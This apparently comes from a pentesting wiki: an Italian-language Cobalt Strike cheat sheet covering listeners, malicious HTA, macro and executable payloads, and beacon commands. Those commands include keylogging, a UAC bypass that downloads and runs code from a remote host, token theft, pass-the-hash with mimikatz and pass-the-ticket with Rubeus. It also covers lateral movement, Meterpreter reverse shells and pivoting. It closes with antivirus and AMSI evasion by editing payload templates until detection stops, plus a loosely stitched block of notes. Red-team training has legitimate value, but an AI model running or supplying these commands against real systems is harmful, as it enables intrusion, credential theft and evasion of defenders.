# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` quindi puoi selezionare dove ascoltare, quale tipo di beacon utilizzare (http, dns, smb...) e altro.

### Peer2Peer Listeners

I beacon di questi listener non devono comunicare direttamente con il C2, possono comunicare tramite altri beacon.

`Cobalt Strike -> Listeners -> Add/Edit` quindi devi selezionare i beacon TCP o SMB

* Il **beacon TCP imposterà un listener nella porta selezionata**. Per connettersi a un beacon TCP usa il comando `connect <ip> <port>` da un altro beacon
* Il **beacon smb ascolterà in un pipename con il nome selezionato**. Per connettersi a un beacon SMB devi usare il comando `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`** per file HTA
* **`MS Office Macro`** per un documento office con una macro
* **`Windows Executable`** per un .exe, .dll o servizio .exe
* **`Windows Executable (S)`** per un **stageless** .exe, .dll o servizio .exe (meglio stageless che staged, meno IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Questo genererà uno script/eseguibile per scaricare il beacon da cobalt strike in formati come: bitsadmin, exe, powershell e python

#### Host Payloads

Se hai già il file che vuoi ospitare in un server web vai su `Attacks -> Web Drive-by -> Host File` e seleziona il file da ospitare e la configurazione del server web.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Esegui binario .NET locale
execute-assembly &#x3C;/path/to/executable.exe>

# Screenshots
printscreen    # Scatta un singolo screenshot tramite il metodo PrintScr
screenshot     # Scatta un singolo screenshot
screenwatch    # Scatta screenshot periodici del desktop
## Vai su View -> Screenshots per vederli

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes per vedere i tasti premuti

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inietta l'azione di portscan all'interno di un altro processo
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Importa il modulo Powershell
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;scrivi qui il comando powershell>

# User impersonation
## Generazione del token con credenziali
make_token [DOMAIN\user] [password] #Crea un token per impersonare un utente nella rete
ls \\computer_name\c$ # Prova a usare il token generato per accedere a C$ in un computer
rev2self # Smetti di usare il token generato con make_token
## L'uso di make_token genera l'evento 4624: Un account è stato effettuato l'accesso con successo. Questo evento è molto comune in un dominio Windows, ma può essere ristretto filtrando sul Tipo di Accesso. Come accennato sopra, utilizza LOGON32_LOGON_NEW_CREDENTIALS che è di tipo 9.

# UAC Bypass
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Ruba token da pid
## Come make_token ma rubando il token da un processo
steal_token [pid] # Inoltre, questo è utile per azioni di rete, non azioni locali
## Dalla documentazione API sappiamo che questo tipo di accesso "consente al chiamante di clonare il proprio token attuale". Ecco perché l'output del Beacon dice Impersonated &#x3C;current_username> - sta impersonando il nostro token clonato.
ls \\computer_name\c$ # Prova a usare il token generato per accedere a C$ in un computer
rev2self # Smetti di usare il token da steal_token

## Avvia processo con nuove credenziali
spawnas [domain\username] [password] [listener] #Fallo da una directory con accesso in lettura come: cd C:\
## Come make_token, questo genererà l'evento Windows 4624: Un account è stato effettuato l'accesso con successo ma con un tipo di accesso di 2 (LOGON32_LOGON_INTERACTIVE). Dettaglierà l'utente chiamante (TargetUserName) e l'utente impersonato (TargetOutboundUserName).

## Inietta nel processo
inject [pid] [x64|x86] [listener]
## Da un punto di vista OpSec: Non eseguire iniezioni cross-platform a meno che non sia davvero necessario (ad es. x86 -> x64 o x64 -> x86).

## Pass the hash
## Questo processo di modifica richiede la patching della memoria LSASS che è un'azione ad alto rischio, richiede privilegi di amministratore locale e non è sempre praticabile se Protected Process Light (PPL) è abilitato.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash tramite mimikatz
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## Senza /run, mimikatz avvia un cmd.exe, se stai eseguendo come utente con Desktop, vedrà la shell (se stai eseguendo come SYSTEM sei a posto)
steal_token &#x3C;pid> #Ruba il token dal processo creato da mimikatz

## Pass the ticket
## Richiedi un ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## Crea una nuova sessione di accesso da utilizzare con il nuovo ticket (per non sovrascrivere quello compromesso)
make_token &#x3C;domain>\&#x3C;username> DummyPass
## Scrivi il ticket nella macchina dell'attaccante da una sessione poweshell &#x26; caricalo
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket da SYSTEM
## Genera un nuovo processo con il ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Ruba il token da quel processo
steal_token &#x3C;pid>

## Estrai ticket + Pass the ticket
### Elenca i ticket
execute-assembly C:\path\Rubeus.exe triage
### Dump ticket interessanti per luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### Crea una nuova sessione di accesso, annota luid e processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Inserisci il ticket nella sessione di accesso generata
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Infine, ruba il token da quel nuovo processo
steal_token &#x3C;pid>

# Lateral Movement
## Se un token è stato creato verrà utilizzato
jump [method] [target] [listener]
## Metodi:
## psexec                    x86   Usa un servizio per eseguire un artefatto Service EXE
## psexec64                  x64   Usa un servizio per eseguire un artefatto Service EXE
## psexec_psh                x86   Usa un servizio per eseguire una riga di comando PowerShell
## winrm                     x86   Esegui uno script PowerShell tramite WinRM
## winrm64                   x64   Esegui uno script PowerShell tramite WinRM

remote-exec [method] [target] [command]
## Metodi:
<strong>## psexec                          Esecuzione remota tramite Service Control Manager
</strong>## winrm                           Esecuzione remota tramite WinRM (PowerShell)
## wmi                             Esecuzione remota tramite WMI

## Per eseguire un beacon con wmi (non è nel comando jump) basta caricare il beacon ed eseguirlo
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## Sul host metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Su cobalt: Listeners > Add e imposta il Payload su Foreign HTTP. Imposta l'Host su 10.10.5.120, la Porta su 8080 e clicca su Salva.
beacon> spawn metasploit
## Puoi solo avviare sessioni Meterpreter x86 con il listener estero.

# Pass session to Metasploit - Through shellcode injection
## Sul host metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## Esegui msfvenom e prepara il listener multi/handler

## Copia il file binario nell'host di cobalt strike
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inietta il codice shell di metasploit in un processo x64

# Pass metasploit session to cobalt strike
## Genera shellcode Beacon stageless, vai su Attacks > Packages > Windows Executable (S), seleziona il listener desiderato, seleziona Raw come tipo di output e seleziona Usa payload x64.
## Usa post/windows/manage/shellcode_inject in metasploit per iniettare il codice shell di cobalt strike generato


# Pivoting
## Apri un proxy socks nel teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Avoiding AVs

### Artifact Kit

Di solito in `/opt/cobaltstrike/artifact-kit` puoi trovare il codice e i modelli precompilati (in `/src-common`) dei payload che cobalt strike utilizzerà per generare i beacon binari.

Utilizzando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con la backdoor generata (o semplicemente con il modello compilato) puoi scoprire cosa fa scattare il defender. Di solito è una stringa. Pertanto, puoi semplicemente modificare il codice che genera la backdoor in modo che quella stringa non appaia nel binario finale.

Dopo aver modificato il codice, esegui semplicemente `./build.sh` dalla stessa directory e copia la cartella `dist-pipe/` nel client Windows in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Non dimenticare di caricare lo script aggressivo `dist-pipe\artifact.cna` per indicare a Cobalt Strike di utilizzare le risorse dal disco che vogliamo e non quelle caricate.

### Resource Kit

La cartella ResourceKit contiene i modelli per i payload basati su script di Cobalt Strike, inclusi PowerShell, VBA e HTA.

Utilizzando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con i modelli puoi scoprire cosa non piace al difensore (AMSI in questo caso) e modificarlo:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modificando le righe rilevate si può generare un modello che non verrà catturato.

Non dimenticare di caricare lo script aggressivo `ResourceKit\resources.cna` per indicare a Cobalt Strike di utilizzare le risorse dal disco che vogliamo e non quelle caricate.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

